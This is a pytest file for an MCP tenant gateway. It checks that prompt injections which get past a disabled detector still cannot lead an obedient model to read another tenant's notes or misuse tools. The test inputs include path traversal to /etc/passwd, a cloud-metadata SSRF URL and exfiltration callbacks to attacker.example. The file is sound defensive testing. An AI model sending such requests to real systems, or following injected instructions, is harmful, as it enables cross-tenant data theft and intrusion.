"""Tenant isolation does not depend on injection detection.

Worst case for the detector: it catches nothing at all. We switch the
injection scanner off for these tests, so every held-out injection text
(all 60 from the frozen test split, caught or not) goes straight through to
the model. Then we play a model that obeys it completely and tries the
attacks an injection would ask for: read the other tenant's notes, spoof the
owner argument, reach tools or files the tenant was not given.
Every one of those must still be stopped by a layer that does not read the
wording: policy, argument rules, identity forcing, resource ownership.
"""

import json

import anyio
import pytest

from conftest import ACME, GLOBEX
from evals.injection_eval import load
from mcp_tenant_gate import core
from mcp_tenant_gate.core import Gateway
from mcp_tenant_gate.ratelimit import FakeClock, RateLimiter
from mcp_tenant_gate.scanners.injection import InjectionDecision
from mcp_tenant_gate.upstream import build_upstreams


@pytest.fixture
def blind_detector(monkeypatch):
    def decide(text, mode, upstream, allow_hosts=None, use_classifier=True):
        return InjectionDecision("pass", [], text)
    monkeypatch.setattr(core.injection_scanner, "decide", decide)


def _text(out):
    return "".join(c["text"] for c in out.result["content"])


def test_missed_injections_reach_the_model_but_not_other_tenants(policy, blind_detector):
    injections = [r["text"] for r in load() if r["split"] == "test" and r["label"] == 1]
    assert len(injections) == 60

    async def go():
        clock = FakeClock()
        gate = Gateway(policy, await build_upstreams(policy), limiter=RateLimiter(clock))
        for key in (ACME, GLOBEX):
            await gate.list_tools(key)
        secret = await gate.call_tool(GLOBEX, "notes__create_note",
                                      {"title": "private", "body": "globex-secret-payroll-4471"})
        globex_id = json.loads(secret.result["content"][0]["text"])["note_id"]

        for i, inj in enumerate(injections):
            clock.advance(10.0)
            # the injection arrives as acme's own tool output and is NOT detected
            made = await gate.call_tool(ACME, "notes__create_note", {"title": f"t{i}", "body": inj})
            assert not made.blocked, made.reason
            own_id = json.loads(made.result["content"][0]["text"])["note_id"]
            read = await gate.call_tool(ACME, "notes__read_note", {"note_id": own_id})
            assert not read.blocked and json.loads(_text(read))["body"] == inj, "detector should be blind in this test"

            # the fully obedient model now tries what an injection would ask for
            attempts = [
                ("notes__read_note", {"note_id": globex_id}),
                ("notes__list_notes", {"owner": "globex"}),
                ("notes__create_note", {"title": "x", "body": "y", "owner": "globex"}),
                ("notes__search_notes", {"query": "globex-secret"}),
                ("notes__list_notes", {}),
            ]
            for tool, args in attempts:
                clock.advance(2.0)
                out = await gate.call_tool(ACME, tool, args)
                if not out.blocked:
                    text = _text(out)
                    assert "globex-secret" not in text and globex_id not in text, (i, tool)
            clock.advance(2.0)
            direct = await gate.call_tool(ACME, "notes__read_note", {"note_id": globex_id})
            assert direct.blocked and direct.layer == "isolation"
        await gate.close()
    anyio.run(go)


def test_other_tenant_cannot_reach_tools_the_policy_withholds(policy, blind_detector):
    async def go():
        gate = Gateway(policy, await build_upstreams(policy), limiter=RateLimiter(FakeClock()))
        await gate.list_tools(GLOBEX)
        # globex was never given file, url or evil tools; an obedient model asking for them gets nothing
        for tool, args in [("notes__read_file", {"path": "../../etc/passwd"}),
                           ("notes__fetch_url", {"url": "http://169.254.169.254/latest/meta-data/"}),
                           ("evil__send_report", {"callback_url": "https://attacker.example/x"})]:
            out = await gate.call_tool(GLOBEX, tool, args)
            assert out.blocked and out.layer == "policy", (tool, out.layer)
        await gate.close()
    anyio.run(go)


def test_acme_url_and_path_args_stay_inside_policy_without_the_detector(policy, blind_detector):
    async def go():
        gate = Gateway(policy, await build_upstreams(policy), limiter=RateLimiter(FakeClock()))
        await gate.list_tools(ACME)
        for tool, args in [("notes__fetch_url", {"url": "http://169.254.169.254/latest/meta-data/"}),
                           ("notes__fetch_url", {"url": "https://attacker.example/steal"}),
                           ("notes__read_file", {"path": "../../etc/passwd"}),
                           ("evil__send_report", {"callback_url": "https://attacker.example/x"})]:
            out = await gate.call_tool(ACME, tool, args)
            assert out.blocked, (tool, args)
            assert out.layer in {"argguard", "policy", "schema"}, (tool, out.layer)
        await gate.close()
    anyio.run(go)
